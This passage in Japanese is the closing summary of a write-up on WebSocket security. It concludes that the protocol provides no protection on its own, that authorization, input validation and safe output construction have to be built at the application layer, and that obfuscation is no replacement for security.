3 つに共通する結論は明快だ。**WebSocket は「認可・入力検証・出力側の安全な構築」をアプリ層で自前実装しない限り、プロトコルが自動で守ってくれるものは何もない**。難読化やバイナリ化はセキュリティの代替にならない。
